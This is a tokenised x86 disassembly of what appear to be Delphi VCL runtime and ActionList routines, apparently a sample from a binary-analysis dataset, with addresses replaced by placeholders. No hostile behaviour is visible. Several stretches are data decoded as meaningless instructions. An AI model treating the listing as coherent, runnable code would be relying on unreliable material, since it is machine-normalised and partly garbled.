mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_453f3c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_453f20
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_453f20
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_45402c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403290
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403290
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403290
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403290
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404008
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404008
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4540b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45422c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408d00
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_40405c
mov eax [ rw-data ]
call sub_4044c8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d00
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40405c
mov eax [ rw-data ]
call sub_4044c8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4044c8
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41857c
mov [ rw-data ] eax
call sub_453cb8
mov dl 0x1
mov eax [ r-xdata ]
call sub_453ae0
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_465e58
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_466f3c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_468b24
mov ecx r-xdata
mov edx sub_445c04
mov eax [ r-xdata ]
call sub_417ad0
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454233
lea eax [ ebp - 0x10 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45429c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4542fb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454302
retn
mov eax rw-data
call sub_40d070
call sub_45402c
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_404008
sub_454304
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45438a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454391
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_4540b4
mov eax [ r-xdata ]
call sub_417944
mov eax [ r-xdata ]
call sub_4179e4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417990
sub_4545d8
stc
push ebx
push eax
inc [ ebp + ecx * 2 + 0x4dcc0045 ]
inc ebp
add al dl
dec edi
inc ebp
add al dh
dec edi
inc ebp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
mov eax 0x48004544
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0900
inc ebp
js r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ esi + 0x45 ] al
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x5a140006
inc ebp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
aam 0x34
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
arpl [ ebp + 0x74 ] si
adc al 0x56
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
jae r-xdata
inc esp
inc ebp
add [ eax ] bl
add bh bh
adc [ eax + 0x45 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
adc al 0x56
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ ecx + ecx * 4 ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax + 0x4e ] bl
inc ebp
add [ ebx + ecx + 0x42 ] dh
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ esi + ecx + 0x4cc80042 ] ah
inc ebp
add ah bl
dec esi
inc ebp
add [ eax ] bl
dec esi
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor al 0x4d
inc ebp
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
shr [ edx + 0x41 ] 0x1
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x46780000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
inc esi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x68004546 ] dh
add [ eax ] al
add [ eax + 0x45 ] dl
inc ebp
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ edx + esi + 0x40 ] al
inc ebx
jne r-xdata
add al dl
xor al 0x40
add ah dl
je r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
add ah bh
inc eax
dec esp
imul esi [ ebx + 0x74 ] 0x48b0c08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
or al 0xa2
inc ecx
add al dh
mov [ ecx ] eax
test al 0x95
inc ecx
add [ eax - 0x4bffbe6c ] ah
movsb [ edi ] [ esi ]
inc ecx
add al ch
movsb [ edi ] [ esi ]
inc ebx
push 0x65676e61
mov eax 0x50004544
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ eax ] cl
dec edi
outsb
push ebp
jo r-xdata
add [ eax ] al
add al [ eax ]
out dx al
inc ebp
add [ eax ] bl
push edi
inc ebp
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ esi + ecx + 0x51a80042 ] ah
inc ebp
add [ eax + 0x24004211 ] al
adc [ edx ] eax
mov eax 0xe8004210
adc [ edx ] al
mov esp 0x70004210
dec esp
inc ebp
add [ eax + 0x55 ] al
inc ebp
add al bl
push esp
inc ebp
add [ eax + ebx * 2 ] dl
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + r--data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
or eax [ fs : edx ]
rcl [ eax ] 0x42
add [ ebx + ecx * 2 ] bl
inc ebx
jne r-xdata
inc ecx
add ah ch
movsb [ edi ] [ esi ]
popad
je r-xdata
add al al
adc [ edx ] al
sbb al 0x4b
push ecx
inc ebp
add [ edx + edx * 2 + 0x45 ] cl
add [ edx + ecx - 0x76f3ffbe ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
dec esp
imul esi [ ebx + 0x74 ] r-xdata
xor [ edx + 0x41 ] ah
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x49200000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 2 + 0x45 ] dh
add [ eax + 0x4549 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x5bffbab7 ] dl
dec ecx
inc ebp
add [ eax - 0x6c000000 ] ah
inc ebx
inc ebp
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
cld
inc ecx
add al dh
movsb [ edi ] [ esi ]
inc ecx
add [ eax + ebx * 4 - 0x599bffbf ] cl
inc ecx
add al al
cmpsb [ esi ] [ edi ]
inc ecx
add [ edi - 0x6027ffbf ] dl
inc ecx
add al dl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax + ebp * 4 + 0x41 ] al
add [ eax ] ah
pop eax
inc ebp
add [ edx + 0x41 ] dh
add al ch
xchg ebx eax
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3500041 ] eax
inc ecx
add [ ebx - 0x67c7ffbf ] bh
inc ecx
add [ ebp + 0x41 ] cl
add ah cl
0x9ba00041 0x41
mov [ ebp - 0x5a67ffbf ] ah
inc ecx
add [ esp + ebx * 4 ] al
inc ecx
add [ eax - 0x64 ] bl
inc ecx
add [ ebx * 4 - 0x6163ffbf ] al
inc ecx
add ah dh
sahf
inc ecx
add [ eax - 0x27ffbe61 ] cl
mov [ 0xffffffffa2f40041 ] al
inc ecx
add ah ch
movsd [ edi ] [ esi ]
inc ecx
add [ esp ] bh
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax + ebp * 4 ] cl
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 + 0x300045 ] bl
add [ eax ] al
inc eax
popad
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
lea eax [ eax ]
add al 0x48
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4548 ] dh
sub_4549e0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x1800454a ]
add [ eax ] al
add [ ebx + ebp * 2 ] dh
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
jo r-xdata
cmovb eax [ eax ]
or [ eax ] dl
inc edx
add [ eax ] ch
cmovb eax [ eax ]
mov esp 0x1000420f
adc [ edx ] al
mov al 0x50
inc ebp
add ah al
push eax
inc ebp
add al bl
push eax
inc ebp
add ah ch
push eax
inc ebp
add [ eax ] al
push ecx
inc ebp
add [ ecx + edx * 2 ] dl
inc ebp
add [ eax ] ch
push ecx
inc ebp
add [ ecx + edx * 2 ] bh
inc ebp
add [ eax + 0x51 ] dl
inc ebp
add [ ecx + edx * 2 + 0x45 ] ah
add [ eax + 0x51 ] bh
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ eax - 0x7bffbaaf ] al
push ecx
inc ebp
add [ eax - 0x73ffbaaf ] cl
push ecx
inc ebp
add [ eax - 0x6bffbaaf ] dl
push ecx
inc ebp
add [ eax - 0x63ffbaaf ] bl
push ecx
inc ebp
add [ eax - 0x5bffbaaf ] ah
push ecx
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x91e85653
jmp sub_454aac
inc edx
add [ edi + ecx + 0x42 ] ch
add [ edi + ecx + 0x10040042 ] ah
inc edx
add al bl
sub_454aac
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421060
test bl bl
jle r-xdata
mov edx esi
call sub_454ec0
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_454b1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420b74
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_454bc4
sub_454b50
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454ae0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418200
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_41838c
sub_454b98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404414
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_40405c
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_454bc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_454ec0
mov edx ebx
mov eax esi
call sub_454ea0
sub_454bec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_454bc4
sub_454c18
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4698a0
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_40348c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_4210ec
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_445a30
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_454c70
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4698c8
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_40348c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421108
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_445a30
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_454cc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420714
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_454e4c
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_454d34
push ebx
push esi
push edi
call sub_403644
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403290
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4183f8
call sub_403290
mov eax [ edi + 0x30 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420760
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40362c
sub_454d84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_454dcc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41836c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov edx edi
call sub_454b50
sub_454e18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_4566bc
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_456700
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_4207e4
sub_454e58
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420a30
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_454ec0
sub_454ea0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4181b4
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_4207e4
pop esi
pop ebx
retn
sub_454ec0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4184ac
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_454edc
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_454f44
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_45f778
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_457f58
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4557ec
mov edx ebp
call sub_45584c
inc eax
je r-xdata
sub_454fd0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_454ff0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_455010
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_455460
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_455460
sub_4551a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42101c
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4551fc
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403290
mov eax [ esi + 0x9c ]
call sub_403290
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_454aac
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d070
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_45524c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4189f0
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_4552f8
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_455358
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_455460
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_455598
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_4555f8
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_455654
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_4556b8
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4552f8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404414
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_40405c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403440
test eax eax
je r-xdata
sub_455358
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_455450
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
